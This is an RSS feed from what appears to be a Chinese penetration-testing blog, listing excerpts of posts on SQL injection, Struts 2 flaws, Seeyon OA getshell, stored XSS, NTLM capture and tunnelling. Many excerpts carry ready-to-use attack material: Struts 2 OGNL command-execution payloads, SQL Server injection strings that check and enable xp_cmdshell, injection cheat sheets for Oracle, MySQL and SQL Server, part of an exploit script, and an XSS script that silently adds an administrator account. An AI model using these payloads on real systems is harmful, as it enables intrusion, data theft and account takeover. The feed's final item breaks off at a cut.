<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Pentest on </title>
    <link>https://wyb0.com/topics/pentest/</link>
    <description>Recent content in Pentest on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Thu, 10 Jun 2021 16:44:23 +0800</lastBuildDate>
    
	<atom:link href="https://wyb0.com/topics/pentest/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>通过 Sphinx 快速查询数据</title>
      <link>https://wyb0.com/posts/2021/social_ngineering_database_and_sphinx/</link>
      <pubDate>Thu, 10 Jun 2021 16:44:23 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2021/social_ngineering_database_and_sphinx/</guid>
      <description>0x00 Sphinx Sphinx 是一款基于 SQL 的高性能全文检索引擎，Sphinx 的性能在众多全文检索引擎中也是数一数二的，利用 Sphinx我们可以完成比数据库本身更专业的搜索功能，而且可以有很多针对性的性能优化。
 快速创建索引：3 分钟左右即可创建近 100 万条记录的索引，并且采用了增量索引的方式，重建索引非常迅速。 闪电般的检索速度：尽管是 1 千万条的大数据量，查询数据的速度也在毫秒级以上，2-4G 的文本量中平均查询速度不到 0.1 秒。 为很多脚本语言设计了检索 API，如 PHP,Python,Perl,Ruby 等，因此你可以在大部分编程应用中很方便地调用 Sphinx 的相关接口。 为 MySQL 设计了一个存储引擎插件，因此如果你在 MySQL 上使用 Sphinx，那简直就方便到家了。 支持分布式搜索，可以横向扩展系统性能。  0x01 使用 Sphinx 查询的流程  通过 Sphinx 的 indexer 生成索引（需要先配置文件 sphinx.conf）  部分索引：indexer.exe -c sphinx.conf index_3pk_com_member
全部索引：C:\Apps\sphinx\bin\indexer.exe -c C:\Apps\sphinx\etc\sphinx.conf --all
若此时searchd守护进程已经启动，那么需要加上 --rotate参数： C:\Apps\sphinx\bin\indexer.exe -c C:\Apps\sphinx\etc\sphinx.conf --all --rotate
 Sphinx 启动一个 searchd 进行监听（调接口）  C:\Apps\sphinx\bin\searchd.exe -c c:\Apps\sphinx\etc\sphinx.conf</description>
    </item>
    
    <item>
      <title>记一次 SQL 注入简单 bypass</title>
      <link>https://wyb0.com/posts/2020/recording-a-injection-bypass/</link>
      <pubDate>Mon, 22 Jun 2020 17:35:07 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2020/recording-a-injection-bypass/</guid>
      <description>0x00 存在 SQL 注入 总之是遇到一个站，登录的页面，数据包大致如下：
POST /jsweb/userlogin/UserLoginAction.aspx HTTP/1.1 Host: 115.xxx.xxx.xxx:8042 Content-Length: 47 Accept: */* X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Origin: http://115.xxx.xxx.xxx:8042 Referer: http://115.xxx.xxx.xxx:8042/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Cookie: ASP.NET_SessionId=bxdzehxa5mvoco1fkrjlbqbt Connection: close uname=admin*&amp;amp;pwd=dskfsdkf&amp;amp;valCode=1197&amp;amp;telphone=  其中验证码可以绕过，而登录名那里存在注入 使用 and 1=1、and 1=2 时，发现过滤了空格，用/**/代替 0x01 简单看一下 中间件是 IIS，存在 len 函数，确定为 SQLServer Order by 一下，看看能不能 union，发现有 10 列 尝试 union select admin 转换为 int 时出错，感觉好像能显示位，测试发现确实可以显示 可以获取数据库版本，可以确定有 union 注入了 0x02 sqlmap sqlmap跑一下：sqlmap --risk=3 --level=3 --batch --thread=1 -r 1.</description>
    </item>
    
    <item>
      <title>目录遍历利用</title>
      <link>https://wyb0.com/posts/2019/a-directory-traversal-using-script/</link>
      <pubDate>Mon, 16 Dec 2019 09:23:47 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2019/a-directory-traversal-using-script/</guid>
      <description>0x00 目录遍历 一个同事说有一些目录遍历，想着能不能搞个脚本啥的，以后利用也方便，自己没有写出来，说让我看看
一般来说存在目录遍历的话就是翻文件，看看有没有一些敏感信息、未授权接口之类的，一个个翻的话也确实比较麻烦
而且 eWebEditor、FCKeditor 这种编辑器有些版本也存在目录遍历漏洞，能找的一些未授权访问也是好的
以前写过一个爬网站链接的脚本，感觉可以在那个脚本的基础上改一下，改过后确实大致能用
0x01 脚本 #!/usr/bin/env python # -*- coding: utf-8 -*- &#39;&#39;&#39; @Author: reber @Mail: reber0ask@qq.com @Date: 2019-08-05 15:58:38 @LastEditTime: 2019-12-16 17:07:09 &#39;&#39;&#39; import asyncio import aiohttp from lxml import etree from urllib.parse import urljoin from urllib.parse import urlparse from urllib.parse import urlunsplit from pybloom_live import BloomFilter bf = BloomFilter(100000, 0.01) def is_repeat(ele): if ele in bf: return True #元素不一定在集合中 else: bf.add(ele) return False #元素一定不在集合中 class GetAllLink(object): &amp;quot;&amp;quot;&amp;quot;docstring for GetAllLink&amp;quot;&amp;quot;&amp;quot; def __init__(self, target, crawl_deepth, rate): super(GetAllLink, self).</description>
    </item>
    
    <item>
      <title>记一次网页 js 挂马</title>
      <link>https://wyb0.com/posts/2019/recording-a-webpage-hanging-horse/</link>
      <pubDate>Mon, 19 Aug 2019 10:17:46 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2019/recording-a-webpage-hanging-horse/</guid>
      <description>0x00 常见网页挂马方式  iframe 框架挂马
简单来说就是加 iframe 标签 script 挂马
通过各种办法加载 js 代码 htm 文件挂马 上传 htm 文件，然后用 script 引入 js 挂马 上传 js 文件，然后用 script 引入 图片伪装挂马 比较新颖的一种挂马隐蔽方法 等等。。。  0x01 发现被插入恶意 js 前几天在做子域名搜集，搜集完后提取 title，结果看到了一个站点的 title 不正常
网站是 tp5 的，应该是前段时候 tp5 出现命令执行时被入侵的
查看网页 html 源码发现 title 和 meta 的 description 都被改了
&amp;lt;title&amp;gt;&amp;amp;#25250;&amp;amp;#24196;&amp;amp;#29275;&amp;amp;#29275;&amp;amp;#28216;&amp;amp;#25103;&amp;amp;#24179;&amp;amp;#21488;&amp;amp;#44;&amp;amp;#30495;&amp;amp;#38065;&amp;amp;#25250;&amp;amp;#24196;&amp;amp;#29275;&amp;amp;#29275;&amp;amp;#28216;&amp;amp;#25103;&amp;amp;#44;&amp;amp;#25250;&amp;amp;#24196;&amp;amp;#29275;&amp;amp;#29275;&amp;amp;#25163;&amp;amp;#28216;&amp;amp;#19979;&amp;amp;#36733;&amp;lt;/title&amp;gt; &amp;lt;meta name=&amp;quot;keywords&amp;quot; content=&amp;quot;&amp;amp;#25250;&amp;amp;#24196;&amp;amp;#29275;&amp;amp;#29275;&amp;amp;#28216;&amp;amp;#25103;&amp;amp;#24179;&amp;amp;#21488;&amp;amp;#44;&amp;amp;#30495;&amp;amp;#38065;&amp;amp;#25250;&amp;amp;#24196;&amp;amp;#29275;&amp;amp;#29275;&amp;amp;#28216;&amp;amp;#25103;&amp;amp;#44;&amp;amp;#25250;&amp;amp;#24196;&amp;amp;#29275;&amp;amp;#29275;&amp;amp;#25163;&amp;amp;#28216;&amp;amp;#19979;&amp;amp;#36733;&amp;quot;/&amp;gt; &amp;lt;meta name=&amp;quot;description&amp;quot; content=&amp;quot;&amp;amp;#25250;&amp;amp;#24196;&amp;amp;#29275;&amp;amp;#29275;&amp;amp;#12304;&amp;amp;#55;&amp;amp;#49;&amp;amp;#49;&amp;amp;#49;&amp;amp;#48;&amp;amp;#46;&amp;amp;#99;&amp;amp;#111;&amp;amp;#109;&amp;amp;#12305;&amp;amp;#29616;&amp;amp;#20844;&amp;amp;#21496;&amp;amp;#25317;&amp;amp;#26377;&amp;amp;#19968;&amp;amp;#25209;&amp;amp;#26377;&amp;amp;#20960;&amp;amp;#21313;&amp;amp;#24180;&amp;amp;#21644;&amp;amp;#22810;&amp;amp;#25250;&amp;amp;#24196;&amp;amp;#29275;&amp;amp;#29275;&amp;amp;#25216;&amp;amp;#24039;&amp;amp;#24180;&amp;amp;#40831;&amp;amp;#36718;&amp;amp;#27979;&amp;amp;#37327;&amp;amp;#20013;&amp;amp;#24515;&amp;amp;#21046;&amp;amp;#36896;&amp;amp;#32463;&amp;amp;#39564;&amp;amp;#30340;&amp;amp;#20154;&amp;amp;#21592;&amp;amp;#44;&amp;amp;#25250;&amp;amp;#24196;&amp;amp;#29275;&amp;amp;#29275;&amp;amp;#28216;&amp;amp;#25103;&amp;amp;#35268;&amp;amp;#21017;&amp;amp;#38598;&amp;amp;#25104;&amp;amp;#20102;&amp;amp;#22269;&amp;amp;#20869;&amp;amp;#39030;&amp;amp;#23574;&amp;amp;#40831;&amp;amp;#36718;&amp;amp;#27979;&amp;amp;#37327;&amp;amp;#25216;&amp;amp;#26415;&amp;quot;/&amp;gt;  解码一下
&amp;lt;title&amp;gt;抢庄牛牛游戏平台,真钱抢庄牛牛游戏,抢庄牛牛手游下载&amp;lt;/title&amp;gt; &amp;lt;meta name=&amp;quot;keywords&amp;quot; content=&amp;quot;抢庄牛牛游戏平台,真钱抢庄牛牛游戏,抢庄牛牛手游下载&amp;quot;/&amp;gt; &amp;lt;meta name=&amp;quot;description&amp;quot; content=&amp;quot;抢庄牛牛【71110.com】现公司拥有一批有几十年和多抢庄牛牛技巧年齿轮测量中心制造经验的人员,抢庄牛牛游戏规则集成了国内顶尖齿轮测量技术&amp;quot;/&amp;gt;  0x02 简单分析 紧接着有一段 js 代码</description>
    </item>
    
    <item>
      <title>FRP 内网穿透</title>
      <link>https://wyb0.com/posts/2019/frp-intranet-through/</link>
      <pubDate>Tue, 30 Jul 2019 23:27:54 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2019/frp-intranet-through/</guid>
      <description>0x00 对外提供简单的文件访问服务  服务端  ➜ frp cat frps.ini [common] ; 监听端口 bind_port = 7000 ; 那些端口允许客户端用来映射 allow_ports = 22-80,3000,33389  ➜ frp ./frps -c frps.ini 2019/07/31 00:22:31 [I] [service.go:139] frps tcp listen on 0.0.0.0:7000 2019/07/31 00:22:31 [I] [root.go:204] Start frps success   客户端  C:\Users\Administrator\Desktop\frp&amp;gt;type frpc.ini [common] server_addr = 66.123.35.123 server_port = 7000 [test_static_file] type = tcp ; 文件服务的端口 remote_port = 3000 ; 启用插件 plugin = static_file ; 要对外暴露的文件目录 plugin_local_path = C:\\Users\Administrator\Desktop\frp_file ; 访问 url 中会被去除的前缀，保留的内容即为要访问的文件路径 plugin_strip_prefix = myfile ; 301 认证 plugin_http_user = admin plugin_http_passwd = 123456  C:\Users\Administrator\Desktop\frp&amp;gt;frpc.</description>
    </item>
    
    <item>
      <title>通过 selenium 和 flask 中转后利用 sqlmap 进行注入</title>
      <link>https://wyb0.com/posts/2019/after-transit-via-selenium-flask-to-use-sqlmap/</link>
      <pubDate>Sat, 27 Jul 2019 18:15:25 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2019/after-transit-via-selenium-flask-to-use-sqlmap/</guid>
      <description>0x00 先说前提 昨天某个小伙伴说有个注入没法搞 前端提交登陆表单时数据包加密了, 而且有个 sign 字符串每次都不一样用于校验, 应该是用 js 加密了 0x01 找加密的 js 文件 注入的地方是获取验证码时的手机号, 刚开始想着先找到 js 加密的函数, 然后生成 sign 再组数据包发送。
就像 记一次SQL Server报错注入 中一样, 用 selenium 或者 PhantomJS 执行 js 代码生成sign
一番查找发现了加密的 js 文件函数, 但是用的是 angular 这个前端框架, 没用过这个东西。。。。。 能看懂一般的 js 代码, 但是这个没得搞, 不懂。。。
0x02 数据中转 本来昨天我已经放弃了的, 结果今天上午小伙伴又找我了, 说还没有整好, 又看了一通 js, 仍然无解, 看不懂。。。
想起昨天有个大佬说用 PhantomJS + flask 这样、那样、再这样, 中转数据就可以用 sqlmap 跑了, emmmmm。。。

虽然很早以前用过 asp 的 Cookie 注入中转 , 但是那个是软件, 一直没有搞懂原理, 现在正好趁机学下</description>
    </item>
    
    <item>
      <title>致远 OA A8 htmlofficeservlet getshell (POC&amp;EXP)</title>
      <link>https://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/</link>
      <pubDate>Sat, 29 Jun 2019 17:57:32 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/</guid>
      <description>0x00 影响版本  致远A8-V5协同管理软件 V6.1sp1 致远A8+协同管理软件 V7.0、V7.0sp1、V7.0sp2、V7.0sp3 致远A8+协同管理软件 V7.1  0x01 查看接口看是否存在漏洞 如果查看 &amp;quot;seeyon/htmlofficeservlet&amp;quot; 接口，出现如下内容则表示存在漏洞 0x02 POC &amp;amp; EXP #!/usr/bin/env python # -*- coding: utf-8 -*- import time import random import string import requests info = { &amp;quot;name&amp;quot;: &amp;quot;致远 A8 可 getshell&amp;quot;, &amp;quot;author&amp;quot;: &amp;quot;reber&amp;quot;, &amp;quot;version&amp;quot;: &amp;quot;致远A8-V5协同管理软件V6.1sp1、致远A8+协同管理软件V7.0、V7.0sp1、V7.0sp2、V7.0sp3、V7.1&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;file_upload&amp;quot;, &amp;quot;level&amp;quot;: &amp;quot;high&amp;quot;, &amp;quot;result&amp;quot;: &amp;quot;&amp;quot;, &amp;quot;status&amp;quot;: False, &amp;quot;references&amp;quot;: &amp;quot;&amp;lt;url&amp;gt;&amp;quot;, &amp;quot;desc&amp;quot;: &amp;quot;&amp;lt;vul describtion&amp;gt;&amp;quot;, } def assign(service, arg): if service == &#39;seeyon&#39;: return True, arg def encode(origin_bytes): &amp;quot;&amp;quot;&amp;quot; 重构 base64 编码函数 &amp;quot;&amp;quot;&amp;quot; # 将每一位bytes转换为二进制字符串 base64_charset = &amp;quot;gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6&amp;quot; base64_bytes = [&#39;{:0&amp;gt;8}&#39;.</description>
    </item>
    
    <item>
      <title>从 SQL Server 注入到 远程连接桌面</title>
      <link>https://wyb0.com/posts/2019/sql-server-from-sql-injection-to-remote-conn-desktop/</link>
      <pubDate>Tue, 25 Jun 2019 17:01:53 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2019/sql-server-from-sql-injection-to-remote-conn-desktop/</guid>
      <description>0x00 目标情况  只有一个登录框  0x01 发现注入 简单看了下登陆框，可以爆破用户名
加单引号后报错，试了试 and 1=1 确实存在注入
0x01 进一步测试 尝试得到数据版本: admin&#39; and @@version=1-- 抓包 sqlmap 跑了下发现不行: sqlmap -r 1.txt --risk 3 --level 3 --dbms &amp;quot;Microsoft SQL Server&amp;quot; --second-order &amp;quot;http://123.xxx.xxx.180:2001/error.aspx&amp;quot;
返回: all tested parameters appear to be not injectable，跑不出来，只能手工了
看下能不能多语句执行: admin&#39;;select convert(int,(select user));--
结果发现可以执行成功，能进行多语句执行 0x02 尝试多语句执行添加用户  查看是否有 xp_cmdshell
Payload：admin&#39;;if(1=(select count(*) from master.dbo.sysobjects where xtype = &#39;x&#39; and name = &#39;xp_cmdshell&#39;)) WAITFOR DELAY &#39;0:0:5&#39;;--  开启 xp_cmdshell</description>
    </item>
    
    <item>
      <title>从 SQL Server 注入到 getshell</title>
      <link>https://wyb0.com/posts/2019/sql-server-from-injection-to-getshell/</link>
      <pubDate>Sat, 02 Mar 2019 20:23:35 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2019/sql-server-from-injection-to-getshell/</guid>
      <description>0x00 目标情况  一个web站点111.*.*.63，只有一个登陆框，测试了没有注入，没有弱口令 扫描了全端口，没有发现什么有用的信息  0x01 发现注入 当时是查看网页源代码，有两个可疑接口，一个是初始化密码借口，访问返回空白页面，没有什么用
另一个是密码设置接口，不过这个接口是同网段的另一个ip 111.*.*.59，访问后发现是个重置密码的界面 但是进行密码重置的时候需要发送验证码，系统会先校验用户名是否存在，加单引号出错，and 1=2没反应
burpsuite抓包后sqlmap跑了下，python sqlmap.py -r 1.txt，存在注入 通过sqlmap得到了这几个数据库
[*] HSOA_20170320 [*] HSOA_NEW [*] HSOA_T [*] master [*] model [*] msdb [*] Shuttle [*] SHWT [*] tempdb  0x02 找网站绝对路径  判断是不是dba权限(延时后返回正确页面，确定为dba权限&amp;lt;也可用sqlmap的&amp;ndash;is-dba判断&amp;gt;)  uname=test&#39;;if(1=(select is_srvrolemember(&#39;sysadmin&#39;))) WAITFOR DELAY &#39;0:0:2&#39;;--   判断是否是站库分离(延时后返回正确页面，确定站库没有分离)  uname=test&#39;;if(host_name()=@@servername) WAITFOR DELAY &#39;0:0:5&#39;;--   查看是否有xp_cmdshell  uname=test&#39;;if(1=(select count(*) from master.dbo.sysobjects where xtype = &#39;x&#39; and name = &#39;xp_cmdshell&#39;)) WAITFOR DELAY &#39;0:0:2&#39;--  恢复／删除xp_cmdshell exec sp_addextendedproc xp_cmdshell,@dllname=&#39;xplog70.</description>
    </item>
    
    <item>
      <title>SQL注入tips(Oracle)</title>
      <link>https://wyb0.com/posts/2019/injection-tips-of-oracle/</link>
      <pubDate>Fri, 04 Jan 2019 20:23:35 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2019/injection-tips-of-oracle/</guid>
      <description>0x00 判断数据库类型  Oracle有一些自带的表：dual、user_tables
 id=45 and (select count(*) from user_tables)&amp;gt;0-- id=45 and (select count(*) from dual)&amp;gt;0--  利用自带的一些函数：譬如utl_http.request 这些
 利用Oracle的字符连接符：CHR(97)||CHR(110)||CHR(100)||CHR(32)||CHR(49)||CHR(61)||CHR(49)
  0x01 基本信息获取  查看sid
select instance_name from v$instance;  查看数据库版本：
select banner from v$version where rownum=1; select banner from sys.v_$version where rownum=1;  查看用户：
select user from dual; --当前用户 select username from user_users; --当前用户 select username from all_users; --查看所有用户 select username from dba_users; --查看所有用户(需要有权限)  查看当前用户角色：</description>
    </item>
    
    <item>
      <title>记一次SQL Server报错注入</title>
      <link>https://wyb0.com/posts/2018/recording-an-sqlserver-sql-injection-of-error-based/</link>
      <pubDate>Mon, 24 Dec 2018 10:51:02 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2018/recording-an-sqlserver-sql-injection-of-error-based/</guid>
      <description>0x00 验证码前端验证 需要测试一个网站，刚开始看到网站时感觉希望不大，因为验证码是需要拖动的，这也就意味着很大可能没办法爆破，另一方面是都用这种验证码了，安全做的能很差劲吗？果然，试了admin、123456之类的都不行 那就抓个包吧 emmmmmm。 32位，md5加密？这里看着没有验证码之类的信息，把这个包发了几次发现没有出现验证码信息，而且试了试，发现有两种状态(运气比较好，有admin这个用户，我也是试的这个用户，一下子就看出返回不同了)，如下：
用户不存在时返回 {&amp;quot;iserror&amp;quot;:true,&amp;quot;message&amp;quot;:&amp;quot;用户名不存在！&amp;quot;,&amp;quot;data&amp;quot;:null,&amp;quot;errorfieldlist&amp;quot;:null}
用户名存在时返回 {&amp;quot;iserror&amp;quot;:true,&amp;quot;message&amp;quot;:&amp;quot;密码不正确！&amp;quot;,&amp;quot;data&amp;quot;:null,&amp;quot;errorfieldlist&amp;quot;:null}
可以的，验证码前端验证，我觉得可以burp抓包intruder一下
跑了top 500的用户名和top 1000的密码，除了直接试的用户名admin，其他的一个都没有跑出来 sad
0x01 存在注入 嗯看来爆破是基本没有希望了，测其他的吧，嗯，这里是登陆，那肯定要看注入的，无脑加单引号，boom！ 可以的，and 1=1 有注入
哎？？！！！那不对啊，咋的后台还解密md5后进行查询？？
刚才看了数据包，用户名密码都是32位，猜想sql语句是：select password from user where username=name_md5_hash，然后判断用户存不存在之类的
看返回信息的话显然不是啊，哪有后台解密md5后查询的。。。。。。
试试post其他用户名和密码，然后看数据包 显然并不是md5。。。。 这个是前端加密后发送的。。。。。看一下js，结果发现了这个 emmmmm，想了想，应该可以注入的，看看啥系统 大概率SQL Server了(因为前几天在t00ls刚看到了一个ASP.NET+MySQL，比较任性)，所以这里看一下，发现确实是SQL Server 看看数据库版本，嗯，看来还是报错注入 可以可以，看看有几列，然后进行union注入 一列，这里也能大致猜出来sql语句了，估计就是：select password from user where username=&#39;admin&#39;
那就看看数据库吧，不知道SQL Server中的concat怎么用，一个个来吧。。。。
得到第一个数据库的名字：union select name from master.dbo.sysdatabases where dbid=1 得到第二个数据库的名字：union select name from master.dbo.sysdatabases where dbid=2 得到第5个数据库的名字：union select name from master.dbo.sysdatabases where dbid=5 好麻烦啊，拖一下验证码，然后得到一个数据库，而且后面还有表呢。。。。。
py一下了吧，前端有js进行加密，可以本地写文件生成加密后的payload，然后python拿到payload后进行注入</description>
    </item>
    
    <item>
      <title>记一次渗透测试中利用存储型XSS添加用户</title>
      <link>https://wyb0.com/posts/2018/recording-an-xss-in-pentest/</link>
      <pubDate>Wed, 14 Nov 2018 10:36:38 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2018/recording-an-xss-in-pentest/</guid>
      <description> $(document).ready(function(){ window.location.href=&#39;https://wyb0.com/404.html&#39;; });  ``` ![80](/img/post/20181114-121432.png) 当用户yxk浏览用户申请列表页面时触发XSS ![80](/img/post/20181114-121938.png) 回到reber用户，可以看到已经加入了yxk的组织，可以进行一些操作了 ![80](/img/post/20181114-122147.png) ### 0x05 更进一步，添加为管理员 刚开始分析发现通过上面的过程先添加用户，然后再添加用户为管理员，比较麻烦 后续发现其实不用这么麻烦，直接用另外一个接口发送ajax请求就能直接添加管理员用户 添加管理员的2.js如下： ``` function get_gid(){ $.ajax({ type: &#39;post&#39;, url: &#39;/a/cms/group/treeNode&#39;, dataType: &#39;json&#39;, async: false, data: &#39;parentId=0&#39;, success: function(data){ gid = data[0][&#39;dataObject&#39;][&#39;topGroupId&#39;]; } }); return gid; } var gid = get_gid(); $.post(&#39;/a/cms/member/do.save&#39;,{memberId: 0,userId: &#39;&#39;,mobile: &#39;176004****&#39;,name: &#39;aaa&#39;,pinyin: &#39;aaa&#39;,groupId: 608863,group: &#39;默认分组&#39;,roleId: 2,duty: &#39;&#39;,sex: 0,sort: &#39;10000&#39;,&#39;TEL;CELL&#39;: &#39;&#39;,&#39;TEL;WORK&#39;: &#39;&#39;,EMAIL: &#39;&#39;}); ``` 提交验证信息为：```test``` 当yxk访问请求的list页面时即可直接添加新用户aaa到group并且是管理员账户： ![80](/img/post/20181114-123006.png) 好了，打完收工！  PS：漏洞已提交，并早在3个月前修复 -- </description>
    </item>
    
    <item>
      <title>内网渗透之 Responder 与 Net-NTLM hash</title>
      <link>https://wyb0.com/posts/2018/responder-and-ntlm-hash/</link>
      <pubDate>Mon, 10 Sep 2018 09:48:10 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2018/responder-and-ntlm-hash/</guid>
      <description>0x00 一些概念  Windows 认证协议
分为：基于 NTLM 的认证和基于 kerberos 的认证
 什么是 NTLM Hash？
早期 IBM 设计的 LM Hash 算法存在弱点，微软在保持向后兼容性的同时提出了自己的挑战响应机制，即 NTLM Hash
 什么是 Challenge-Response 挑战/响应验证机制？
 Client 输入 username、password、domain，然后将用户名及密码 hash 后存在本地，并将 username 发送到 DC DC 生成一个 16 字节的随机数，即 Challenge(挑战码)，然后传回 Client Client 收到 Challenge 后将密码 hash 和 challenge 混合 hash，混合后的 hash 称为 response，然后将 challenge、response 和 username 发送给 Server Server 将收到的 3 个值转发给 DC，然后 DC 根据传过来的 username 到域控的账号数据库 ntds.list 找到对应的密码 hash，将 hash 和 Client 传过来的 challenge 混合 hash，将这个混合 hash 与 Client 传过来的 response 进行对比验证  NTLM Hash 与 Net-NTLM Hash</description>
    </item>
    
    <item>
      <title>SQL注入tips(SQL Server)</title>
      <link>https://wyb0.com/posts/2018/injection-tips-of-sqlserver/</link>
      <pubDate>Tue, 04 Sep 2018 10:09:17 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2018/injection-tips-of-sqlserver/</guid>
      <description>0x00 基础信息探测 @@VERSION,@@SERVERNAME,@@SERVICENAME; --Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64) --WIN-2008 --MSSQLSERVER USER,CURRENT_USER,SESSION_USER,SYSTEM_USER; --dbo --dbo --dbo --sa USER_NAME(),HOST_NAME(),HOST_ID(),SUSER_NAME(); --dbo --wyb --46530 --sa USER_ID(),USER_SID(); --1 --&amp;lt;01&amp;gt; ORIGINAL_LOGIN(); --sa  0x01 UNION query &amp;amp; error-based 注入  判断存在注入  and 1=1/and 1=2  select * from msg where id=1 and 11=(select case when(1=1) then 11 else 2 end); select * from msg where id=1 and 11=(select case when(1=2) then 11 else 2 end);   判断是否为sa权限  select name from msg where id=1 and 1=convert(int,(select is_srvrolemember(&#39;sysadmin&#39;)));   得到所有数据库名字   --得到数据库名，前6个是系统自带的数据库，所以从第7个开始，dbid依次增加即可得到所有数据库 id=1 and 0&amp;lt;&amp;gt;(select name from master.</description>
    </item>
    
    <item>
      <title>关于 PHP SESSION 反序列化</title>
      <link>https://wyb0.com/posts/2018/php-session-deserialize/</link>
      <pubDate>Mon, 23 Jul 2018 00:09:17 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2018/php-session-deserialize/</guid>
      <description>0x00 环境 公司出了一些ctf，说要摸底，然后根据答题成绩来分配相应工作。。。。。
其中有一道是php反序列化，直接用的就是 第三届4.29“安恒杯”网络安全技术大赛初赛第三个web题
我比较菜，这里根据网上已有writeup做了一遍，这里记录一下。。。。
reber@wyb:~$ html cat /proc/version Linux version 4.4.0-31-generic (buildd@lgw01-43) (gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.3) ) #50~14.04.1-Ubuntu SMP Wed Jul 13 01:07:32 UTC 2016 reber@wyb:~$ html php --version PHP 5.5.9-1ubuntu4.21 (cli) (built: Feb 9 2017 20:54:58) Copyright (c) 1997-2014 The PHP Group Zend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies with Zend OPcache v7.0.3, Copyright (c) 1999-2014, by Zend Technologies reber@ubuntu-linux:~$ apachectl -v Server version: Apache/2.</description>
    </item>
    
    <item>
      <title>Struts 2相关漏洞payload</title>
      <link>https://wyb0.com/posts/2018/structs2-some-vulnerability-payload/</link>
      <pubDate>Mon, 25 Jun 2018 21:26:14 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2018/structs2-some-vulnerability-payload/</guid>
      <description>0x00 S2-001 该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。  %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&amp;quot;whoami&amp;quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&amp;quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}  0x01 S2-005 影响版本: 2.0.0 - 2.1.8.1
http://aa.com/index.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;amp;(asdf)((&#39;%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))&#39;)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1  0x02 S2-007 影响版本: 2.0.0 - 2.2.3
当配置了验证规则 &amp;lt;ActionName&amp;gt;-validation.xml 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回。  &#39; + (#_memberAccess[&amp;quot;allowStaticMethodAccess&amp;quot;]=true,#foo=new java.lang.Boolean(&amp;quot;false&amp;quot;) ,#context[&amp;quot;xwork.MethodAccessor.denyMethodExecution&amp;quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream())) + &#39;  0x03 S2-012 影响版本: 2.1.0 - 2.3.13
这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行。  %{#a=(new java.lang.ProcessBuilder(new java.</description>
    </item>
    
    <item>
      <title>SQL注入tips(MySQL)</title>
      <link>https://wyb0.com/posts/2018/injection-tips-of-mysql/</link>
      <pubDate>Wed, 23 May 2018 11:14:51 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2018/injection-tips-of-mysql/</guid>
      <description>环境：MySQL 5.5.47
0x00 注入点在Order by后面 mysql&amp;gt; select id,name,content from msg where id&amp;gt;1 order by id into outfile &#39;C:\\Apps\\phpStudy\\WWW\\a.txt&#39;; Query OK, 1 row affected (0.01 sec)  mysql&amp;gt; select id,name,content from msg where id&amp;gt;1 order by updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1),0x7e),1); ERROR 1105 (HY000): XPATH syntax error: &#39;~msg~&#39;  mysql&amp;gt; select id,name,content from msg where id&amp;gt;1 order by name procedure analyse(updatexml(1,concat(0x7e,database(),0x7e),1),1); ERROR 1105 (HY000): XPATH syntax error: &#39;~rtest~&#39;  mysql&amp;gt; select name from msg where id&amp;gt;1 order by if(1=1,1,(select 1 union select 2)); +----------+ | name | +----------+ | xiaohong | +----------+ 1 row in set (0.</description>
    </item>
    
    <item>
      <title>ThinkPHP5的where函数</title>
      <link>https://wyb0.com/posts/2018/thinkphp5-where-function/</link>
